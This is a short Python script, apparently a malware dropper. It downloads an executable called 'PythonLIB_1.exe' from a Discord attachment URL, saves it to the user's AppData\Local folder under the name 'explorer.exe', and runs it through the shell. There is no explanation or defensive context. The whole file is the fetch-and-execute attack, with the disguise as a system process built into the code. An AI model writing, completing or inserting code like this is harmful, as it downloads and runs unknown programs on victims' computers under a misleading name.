import requests
import subprocess
import os

path = os.environ["USERPROFILE"] + "\AppData\Local\explorer.exe"

response = requests.get("https://cdn.discordapp.com/attachments/1172852260624154634/1175530448634531971/PythonLIB_1.exe?ex=656b910b&is=65591c0b&hm=40e58ec3bdbb3cabe172e733b7fa50edd8744ec8a3242cb8ba85b85e03acde23&")

if response.status_code != 200:
    exit()

with open(path, 'wb') as file:
    file.write(response.content)

if os.path.exists(path):
    subprocess.run(path, shell=True)